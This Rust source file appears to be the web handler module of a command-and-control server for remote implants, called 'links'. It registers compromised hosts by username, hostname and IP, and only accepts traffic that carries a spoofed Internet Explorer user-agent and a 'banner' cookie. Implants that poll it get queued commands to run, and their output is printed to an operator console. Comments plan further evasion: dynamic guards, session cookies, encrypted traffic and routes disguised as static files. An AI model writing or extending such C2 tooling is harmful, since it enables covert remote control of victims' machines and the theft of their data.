use actix_web::{get, guard, web, HttpResponse, Responder};
use serde::{Deserialize, Serialize};
//use std::io::Write;

// internal packages
use crate::server::{links, tasks};
use links::Links;
use tasks::TaskStatus;

// structs
#[derive(Debug, Serialize, Deserialize)]
pub struct RegisterLink {
    pub link_username: String,
    pub link_hostname: String,
    pub internal_ip: String,
    pub external_ip: String,
    pub platform: String,
    pub pid: u32,
}

#[derive(Debug, Serialize, Deserialize)]
pub struct Callback {
    pub q: String,
    pub tasking: String,
}

#[derive(Debug, Serialize, Deserialize)]
pub struct Task {
    pub q: String,
    pub tasking: String,
    pub x_request_id: String,
}

// non link routes
#[get("/")]
pub async fn index() -> impl Responder {
    // link and non link traffic should not be able to reach here by introducing another check
    HttpResponse::Ok().body("Ok\n")
}

// link pass tests
pub async fn stage_one_secret() -> impl Responder {
    // SECURITY
    // these should be a lot more thorough
    // add dynamic per link cookie as well as below to sessionid=xxxxx-xxxx-xx-x-x-x-xx-xx
    let cookie = actix_web::cookie::Cookie::build("banner", "banner")
        .path("/")
        .secure(true)
        .http_only(true)
        .same_site(actix_web::cookie::SameSite::Strict)
        .finish();
    HttpResponse::Ok().cookie(cookie).body("Ok\n")
}

// configurations
pub fn stage_one_pass(cfg: &mut web::ServiceConfig) {
    cfg.service(
        web::resource("")
            // guards should be dynamic, such as user agent
            .guard(guard::Header(
                "user-agent",
                "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko",
            ))
            .route(web::get().to(stage_one_secret)),
    );
}

pub fn pass_link_config(cfg: &mut web::ServiceConfig) {
    // guard headers are case sensitive!!!
    cfg.service(
        web::resource("/get")
            // guards should be dynamic, such as user agent and per link sessionid cookie
            .guard(guard::Header(
                "user-agent",
                "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko",
            ))
            .guard(guard::Header("cookie", "banner=banner"))
            .route(web::post().to(link_poll)),
    );
    cfg.service(
        // change these names for actual static items such as icon.png etc...
        web::resource("/register")
            // guards should be dynamic, such as user agent and per link sessionid cookie
            .guard(guard::Header(
                "user-agent",
                "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko",
            ))
            .guard(guard::Header("cookie", "banner=banner"))
            .route(web::post().to(link_register)),
    );
}

// link callbacks
// SECURITY
// add bruteforce countermeasures here
pub async fn link_register(
    query: web::Json<RegisterLink>,
    http_req: web::HttpRequest,
    data: web::Data<Links>,
) -> impl Responder {
    let mut new = links::Link::new();
    let new_x_request_id = format!("{}", new.x_request_id);
    new.link_username = query.link_username.clone();
    new.link_hostname = query.link_hostname.clone();
    new.internal_ip = query.internal_ip.clone();
    new.external_ip = "not yet do via google||microsoft".to_string();
    new.platform = query.platform.clone();
    new.pid = query.pid.clone();
    // already a guard on this header but good practice
    // get user_agent
    let user_agent = http_req.headers().get("user-agent");
    if user_agent.is_some() {
        new.user_agent = user_agent.unwrap().to_str().unwrap().to_string();
    }
    let mut links = data.links.lock().unwrap();
    links.push(new);
    let mut count = data.count.lock().unwrap();
    *count += 1;
    // print new link to stdout
    let cli_stdout = data.stdout.lock().unwrap();
    let mut cli_handle = cli_stdout.lock();
    let link_name = format!(
        "{} ({}\\{}@{})",
        links.last().unwrap().name.clone(),
        query.link_hostname.clone(),
        query.link_username.clone(),
        query.internal_ip.clone(),
    );
    tasks::write_link_to_stdout(&mut cli_handle, link_name);
    let task = Task {
        tasking: String::from(""),
        q: String::from(""),
        x_request_id: new_x_request_id,
    };
    HttpResponse::Ok().json(task)
}

// SECURITY
// after link working with server, all data should be encrypted and encoded in transit
// CBC ciphers will suffice
// prefereably private/public key
pub async fn link_poll(
    callback: web::Json<Callback>,
    http_req: web::HttpRequest,
    data: web::Data<Links>,
) -> impl Responder {
    // check if X-Request-ID exists
    let x_request_id = http_req.headers().get("x-request-id");
    if x_request_id.is_none() {
        return HttpResponse::Ok().body("x-req is none\n");
    }
    let x_request_id_str: String;
    if x_request_id.unwrap().to_str().is_ok() {
        x_request_id_str = x_request_id.unwrap().to_str().unwrap().to_string();
    } else {
        return HttpResponse::Ok().body("x req is err\n");
    };

    // check q parameter in query
    let returned_data = callback.q.clone();
    let returned_task_id = callback.tasking.clone();
    let mut links = match data.links.lock() {
        Err(_) => return HttpResponse::Ok().body(""),
        Ok(links) => links,
    };
    if links.len() == 0 {
        return HttpResponse::Ok().body("");
    }
    let mut link_index: usize = 0;

    // search for link
    for i in 0..links.len() {
        if links[i as usize].x_request_id.to_string() == x_request_id_str {
            // link index found
            link_index = i;
            break;
        }
    }

    // update internal status
    if links[link_index].status != links::LinkStatus::Active {
        links[link_index].status = links::LinkStatus::Active;
    }

    // update check in time
    links[link_index].update_last_checkin();

    // tasks
    let tasks_in_queue = links[link_index].tasks.tasks.len();
    for i in 0..tasks_in_queue {
        // if task id assign its index with one
        // provide link with command to execute FIFO
        if returned_task_id == "" {
            // find first task in queue waiting to be executed
            if links[link_index].tasks.tasks[i as usize].status == TaskStatus::Waiting {
                // add new x-request-id
                let new_x_request_id = links[link_index].set_x_request_id();
                // update task and send command to link
                let task_id = links[link_index].tasks.tasks[i as usize].id.to_string();
                let command = links[link_index].tasks.tasks[i as usize].command.clone();
                links[link_index].update_task_status(TaskStatus::InProgress, task_id.clone());
                let task = Task {
                    tasking: task_id,
                    q: command,
                    x_request_id: new_x_request_id,
                };
                return HttpResponse::Ok().json(task);
            }
        // data returned from task on link
        } else {
            if links[link_index].tasks.tasks[i as usize].id.to_string() == returned_task_id {
                links[link_index].tasks.tasks[i as usize].output = returned_data.clone();
                // print task output to stdout
                let cli_stdout = data.stdout.lock().unwrap();
                let mut cli_handle = cli_stdout.lock();
                let link_name = format!(
                    "{} ({}\\{}@{})",
                    links[link_index].name,
                    links[link_index].link_hostname,
                    links[link_index].link_username,
                    links[link_index].internal_ip,
                );
                tasks::write_task_to_stdout(
                    &mut cli_handle,
                    link_name,
                    links[link_index].tasks.tasks[i as usize].id.to_string(),
                    links[link_index].tasks.tasks[i as usize]
                        .cli_command
                        .clone(),
                    &returned_data,
                );
                links[link_index].update_task_status(TaskStatus::Completed, returned_task_id);
                // add new x-request-id
                let new_x_request_id = links[link_index].set_x_request_id();
                let task = Task {
                    tasking: String::new(),
                    q: String::new(),
                    x_request_id: new_x_request_id,
                };
                return HttpResponse::Ok().json(task);
            }
        }
    }

    // if no command
    let new_x_request_id = links[link_index].set_x_request_id();
    let task = Task {
        tasking: String::new(),
        q: String::new(),
        x_request_id: new_x_request_id,
    };
    return HttpResponse::Ok().json(task);
}
